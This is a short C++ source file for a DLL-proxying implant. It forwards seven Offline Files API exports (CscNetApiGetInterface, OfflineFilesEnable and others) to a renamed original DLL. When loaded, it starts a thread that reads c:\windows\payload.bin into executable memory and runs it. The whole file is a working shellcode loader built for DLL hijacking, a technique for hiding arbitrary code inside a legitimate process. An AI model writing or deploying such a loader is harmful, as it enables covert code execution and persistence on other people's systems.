// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:CscNetApiGetInterface=tmpB736.CscNetApiGetInterface,@1")
#pragma comment(linker, "/export:CscSearchApiGetInterface=tmpB736.CscSearchApiGetInterface,@2")
#pragma comment(linker, "/export:OfflineFilesEnable=tmpB736.OfflineFilesEnable,@3")
#pragma comment(linker, "/export:OfflineFilesGetShareCachingMode=tmpB736.OfflineFilesGetShareCachingMode,@4")
#pragma comment(linker, "/export:OfflineFilesQueryStatus=tmpB736.OfflineFilesQueryStatus,@5")
#pragma comment(linker, "/export:OfflineFilesQueryStatusEx=tmpB736.OfflineFilesQueryStatusEx,@6")
#pragma comment(linker, "/export:OfflineFilesStart=tmpB736.OfflineFilesStart,@7")


DWORD WINAPI Launch(LPVOID lpParameter)
{
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("c:\\windows\\payload.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    fread(buffer, size, 1, fp);
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, size);
    ((void(*) ())exec)();
    return 0;

}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, Launch, NULL, 0, NULL);
        CloseHandle(threadHandle);
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

